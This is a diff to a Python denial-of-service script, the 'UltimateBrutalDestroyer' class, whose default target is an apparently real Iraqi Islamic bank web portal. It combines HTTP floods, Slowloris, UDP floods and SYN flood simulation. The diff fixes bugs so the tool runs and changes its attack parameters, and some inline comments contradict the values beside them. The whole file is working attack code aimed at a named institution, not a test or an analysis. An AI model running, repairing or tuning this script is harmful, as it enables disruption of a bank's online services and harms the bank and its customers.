@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# -- coding: utf-8 --
+# -*- coding: utf-8 -*-
 """
 🔥 BRUTAL SERVER STRESS TEST 🔥
 Ultimate DoS attack using all system resources - merciless brutality
@@ -37,7 +37,7 @@ if platform.system() == 'Windows':
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
 
 class UltimateBrutalDestroyer:
-    def _init_(self, target_url="https://iibss.iraqiislamicb.iq/web/"):
+    def __init__(self, target_url="https://iibss.iraqiislamicb.iq/web/"):
         self.target_url = target_url
         self.successful_requests = 0
         self.failed_requests = 0
@@ -46,9 +46,9 @@ class UltimateBrutalDestroyer:
         
         # System resources - Reduced to half for Windows stability
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 500  # Reduced from 500 to 250 workers per CPU core
-        self.max_sockets = 10000  # Reduced from 10000 to 5000
-        self.max_async_tasks = 5000  # Reduced from 5000 to 2500
+        self.max_workers = self.cpu_count * 100  # Increased from 50 to 100 workers per CPU core
+        self.max_sockets = 2000  # Increased from 1000 to 2000
+        self.max_async_tasks = 1000  # Increased from 500 to 1000
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -85,9 +85,9 @@ class UltimateBrutalDestroyer:
         return {
             'User-Agent': random.choice(self.user_agents),
             'Accept': random.choice([
-                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8',
-                'application/json, text/plain, /',
-                'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8'
+                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'application/json, text/plain, */*',
+                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
             ]),
             'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en-US;q=0.8', 'en-GB,en;q=0.9']),
             'Accept-Encoding': 'gzip, deflate, br',
@@ -149,7 +149,7 @@ class UltimateBrutalDestroyer:
                     self.failed_requests += 1
             
             # Minimal delay for maximum speed
-            time.sleep(random.uniform(0.0001, 0.001))
+            time.sleep(random.uniform(0.00005, 0.0005))  # Reduced from 0.0001-0.001 to 0.00005-0.0005
 
     def slowloris_destroyer(self):
         """Advanced Slowloris attack"""
@@ -288,7 +288,7 @@ class UltimateBrutalDestroyer:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 
                 # Send random UDP packets
-                for _ in range(100):
+                for _ in range(200):  # Increased from 100 to 200
                     if not self.running:
                         break
                     
@@ -309,7 +309,7 @@ class UltimateBrutalDestroyer:
         """SYN flood attack simulation"""
         while self.running:
             try:
-                for _ in range(50):
+                for _ in range(100):  # Increased from 50 to 100
                     if not self.running:
                         break
                     
@@ -349,7 +349,7 @@ class UltimateBrutalDestroyer:
             except Exception:
                 local_failed += 1
             
-            time.sleep(0.0001)
+            time.sleep(0.00005)  # Reduced from 0.0001 to 0.00005
         
         return local_success, local_failed
 
@@ -372,16 +372,16 @@ class UltimateBrutalDestroyer:
         
         # 1. Multi-threaded HTTP attacks
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 100  # Create threads in batches
-        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Reduced from 2000 to 1000
+        thread_batch_size = 200  # Increased from 100 to 200
+        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Increased from 500 to 1000
             batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
             for i in range(batch, batch_end):
                 thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
                 thread.start()
                 threads.append(thread)
             
-            # Small delay between batches
-            time.sleep(0.05)
+            # Reduced delay between batches
+            time.sleep(0.01)  # Reduced from 0.05 to 0.01
             print(f"   Created {len(threads)} threads...")
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
@@ -427,23 +427,23 @@ class UltimateBrutalDestroyer:
         
         # 4. UDP flood
         print("💥 Starting UDP flood...")
-        for i in range(self.cpu_count):
+        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
         # 5. SYN flood simulation
         print("🔥 Starting SYN flood simulation...")
-        for i in range(self.cpu_count * 2):
+        for i in range(self.cpu_count * 4):  # Increased from cpu_count * 2 to cpu_count * 4
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
         # 6. Multi-process attack
         print("🚀 Starting process army...")
-        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count)
+        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count * 2)  # Increased from cpu_count to cpu_count * 2
         process_futures = []
-        for i in range(self.cpu_count):
+        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
             future = process_pool.submit(self.process_worker, i)
             process_futures.append(future)
         
@@ -491,7 +491,7 @@ class UltimateBrutalDestroyer:
             print("💀 FINAL ANNIHILATION REPORT 💀")
             print("=" * 80)
             print(f"🎯 Target: {self.target_url}")
-            print(f"⏱  Duration: {total_time:.2f} seconds")
+            print(f"⏱️  Duration: {total_time:.2f} seconds")
             print(f"📊 Total Requests: {total_requests:,}")
             print(f"✅ Successful: {self.successful_requests:,}")
             print(f"❌ Failed: {self.failed_requests:,}")
@@ -537,7 +537,7 @@ def main():
         print("🧹 Final cleanup completed")
 
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     # Suppress additional warnings for cleaner output
     warnings.filterwarnings('ignore', category=RuntimeWarning)
     warnings.filterwarnings('ignore', category=DeprecationWarning)
